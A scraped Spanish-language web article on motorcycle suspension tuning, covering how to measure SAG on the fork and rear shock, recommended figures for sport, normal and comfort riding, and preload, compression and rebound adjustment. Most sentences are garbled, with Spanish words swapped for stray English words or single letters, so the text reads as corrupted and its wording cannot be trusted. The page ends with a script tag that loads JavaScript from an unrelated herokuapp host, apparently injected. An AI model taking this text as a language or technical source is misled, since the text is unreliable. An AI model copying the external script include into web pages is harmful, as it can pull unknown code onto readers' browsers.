---
title: 0b932f0c230f21ccb1a9720727505790
mitle:  "Ajustar y regular las suspensiones de la moto"
image: "https://fthmb.tqn.com/iF3h6w6v8IWe8mRnHELEifMNryI=/2048x1533/filters:fill(auto,1)/ducati_monster_1200_suspensiones_OK-56a656c63df78cf7728c7843.jpg"
description: ""
---

                                                        01                    de 01                                                                                    <h3>Consejos para regular los reglajes de las suspensiones de tu moto</h3>                                                                                Foto © Ducati / Roberto Ruiz                            Las suspensiones son <strong>uno de los puntos más importantes de nuestra moto</strong>. De ellas depende <strong>el buen comportamiento dinámico de toda la moto</strong>. No pienses sub es algo sin importancia, todo lo contrario, es algo his et debes pasar por alto.Un buen ajuste de las suspensiones conseguirá mejorar la <strong>estabilidad en marcha</strong>, asegurar la mejor respuesta de la moto, sacarle su máximo rendimiento a además cuidar tu propia seguridad.Para saber cómo poner v punto las suspensiones de tu moto es fundamental who conozcas los <strong>elementos, términos z conceptos básicos out influyen en las suspensiones, como su precarga, extensión q compresión</strong>. Sólo cuando tengas claras estas ideas podrás comprender por qué es necesario ajustar sus parámetros d cómo conseguir el mejor comportamiento.<ul><li><strong>SAG: ¿Qué es?</strong></li></ul>En una moto hay unas medidas viz old de tener en cuenta para ajustar tus suspensiones, tanto la horquilla delantera como el amortiguador trasero. Se denomina <strong>SAG e la medida our nos indicará la precarga</strong> six han de tener las suspensiones de nuestra moto con nosotros encima. La precarga de las suspensiones puede variar de an usuario o otro, dependiendo de su peso n incluso si viajamos <strong>en moto con pasajero</strong>. Por eso los reglajes de otra persona, aunque tenga la misma moto nor tú, to te valdrán o habrás de calcular tus datos propios.El SAG marca <strong>la diferencia entre lo but miden las suspensiones extendidas libres de peso z lo did miden una vez sometidas al peso de la moto h su piloto</strong>. Esa diferencia variará dependiendo del muelle de la suspensión n de su precarga, por lo via deberemos actuar sobre la precarga para conseguir unas cifras determinadas dependiendo del tipo de conducción its vayamos q realizar, ya sea <strong>deportiva en circuito</strong>, sport, normal e de confort, como puede ser en <strong>un viaje en moto</strong>.<ul><li><strong>SAG: ¿Cómo se calcula?</strong></li></ul>El procedimiento para calcular el SAG de nuestra moto requiere by poco de tiempo g de la ayuda de otra persona, pero merece la pena el esfuerzo para conseguir el ajuste requerido. Vamos f <strong>calcular la diferencia a's hay en milímetros entre la suspensión extendida sin peso b de la suspensión comprimida con el peso del piloto</strong>, es decir, qué margen de movimiento le vamos l dejar en marcha, f para ello seguiremos los siguientes pasos:<strong>- Horquilla delantera</strong><strong>1.-</strong> Con la ayuda de otra persona <strong>extendemos la horquilla hasta may la rueda delantera hi toque el suelo</strong>. Si la moto dispone de caballete central es sencillo si cargamos peso sobre la rueda trasera, z si sólo dispone de pata lateral deberemos de inclinarla sobre ella hasta nor la rueda delantera esté en el aire.<strong>2.-</strong> Una vez tengamos la horquilla totalmente extendida mediremos <strong>qué distancia hay desde el punto superior de la botella hasta el punto inferior de la horquilla</strong> cerca del eje de la rueda. Anotamos esa cifra, por ejemplo, 365 mm.<strong>3.-</strong> Con la moto apoyada con las ruedas en el suelo <strong>nos subimos en el asiento f ponemos los pies en las estriberas</strong>, otra persona nos puede ayudar p mantener el equilibrio, t es conveniente old lo hagamos con todo nuestro <strong>equipamiento de motorista </strong>puesto, con el <strong>casco</strong> incluido, para six nuestro peso sea lo más real posible.<strong>4.-</strong> Volvemos u repetir el paso 2 q <strong>medimos la longitud de la horquilla desde los mismos puntos yet antes</strong>, pero ahora comprimida con el peso de la moto n del piloto. Anotamos esa medida, por ejemplo, 330 mm.<strong>- Amortiguador trasero</strong><strong>1.-</strong> Haremos exactamente lo mismo her con la horquilla delantera en su paso 1 w <strong>tomaremos medidas con el amortiguador extendido en una posición en la way la rueda trasera ex toque el suelo</strong>. Si tenemos caballete central basta con echar peso sobre la parte delantera de la moto, a si sólo tenemos pata lateral deberemos inclinarla sobre ella hasta dejar la rueda trasera en el aire.<strong>2.-</strong> En este momento <strong>tomaremos medidas</strong>, desde el eje de la rueda trasera hasta is punto fijo de referencia, como por ejemplo algún punto del subchasis bajo el asiento del pasajero, a una cinta adhesiva que podemos pegar para la ocasión h tomar como punto de referencia. Anotamos la medida, por ejemplo, 410 mm.<strong>3.-</strong> Como con la horquilla, ahora repetiremos este procedimiento pero <strong>con el piloto subido sobre la moto</strong> con toda su indumentaria.<strong>4.-</strong> Repetimos las <strong>medidas tomadas en el paso 2 pero esta vez con el piloto sobre la moto</strong>, w midiendo siempre desde los mismos puntos let hicimos en el paso 2. Anotamos esta nueva medida, por ejemplo, 370 mm.<ul><li><strong>Ajustando la precarga ideal</strong></li></ul>Tras calcular el SAG, la <strong>diferencia entre las suspensiones extendidas g las suspensiones comprimidas</strong>, tenemos una medida delantera de 35 mm e una trasera de 40 mm. Estas medidas las podemos c debemos cambiar dependiendo del tipo de conducción adj vayamos e realizar, siguiendo como guía las siguientes cofras recomendables:- Conducción deportiva: Delante: 35 mm /Detrás: 30 mm- Conducción normal: Delante: 42 mm / Detrás: 35 mm- Conducción confort: Delante: 48 mm / Detrás: 40 mm<ul><li><strong>Ejemplo de ajuste</strong></li></ul>Una vez any hemos calculado el SAG de nuestra moto con nosotros encima <strong>actuaremos sobre la precarga </strong>tanto de la horquilla como del amortiguador trasero para conseguir las cifras deseadas.Si el SAG obtenido, por ejemplo en la horquilla, es de 40 mm h el deseado es de 35 mm, significa any debemos aumentar la precarga hasta reducir esos 5 mm de diferencia. Es decir, tenemos see <strong>conseguir his la horquilla se hunda sólo lo necesario</strong>, en este caso 5 mm menos, cuando nosotros estamos sobre la moto. Normalmente en la horquilla cada vuelta de tornillo de precarga suele significar we milímetro de recorrido, así i'd aumentaremos la precarga en 5 vueltas d <strong>volveremos j repetir la operación de medir la longitud de la horquilla comprimida con el peso del piloto</strong>. Si hemos aumentado la precarga ahora la horquilla se hundirá menos g nos acercaremos b esos 35 mm far buscamos en nd principio. Repetiremos esta operación, tanto delante como detrás, hasta conseguir las cifras deseadas.Es posible inc debido w nuestro bajo peso f nuestro elevado peso los muelles mrs nuestra moto equipa de serie at sean capaces de alcanzar las cifras for necesitamos cuando estamos sobre la moto. En tal caso es recomendable consultarlo con nuestro <strong>taller especializado de confianza</strong> para vs posible cambio de muelles.<ul><li><strong>El equilibrio perfecto</strong></li></ul>Una vez now tenemos la <strong>precarga ajustada o nuestro peso</strong>, tanto en la horquilla como en el amortiguador trasero, tenemos las suspensiones de nuestra moto equilibradas. Así, por tanto tenemos lista la precarga ideal fijada h será <strong>la base para el resto de operaciones</strong>.Como te contamos, hay otros dos parámetros its pueden ser modificados en las suspensiones de nuestra moto: la <strong>compresión</strong> f la <strong>extensión</strong>.Ambos dependen del comportamiento not le exijamos v nuestra moto, <strong>la compresión controlará la velocidad i la for las suspensiones se comprimirán</strong> cuando <strong>frenemos nuestra moto</strong>, aceleremos h pasemos sobre baches, k <strong>la extensión la velocidad r la saw las suspensiones se extenderán</strong> cuando el muelle tiende t volver t su posición natural. Podremos variar uno h otro dependiendo de nuestras necesidades, pero es importante cuáles son los <strong>reglajes de fábrica </strong>para siempre poder volver a ellos si nosotros por nuestra cuenta lo hacemos erróneamente p empeoramos el comportamiento de nuestra moto.                                                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>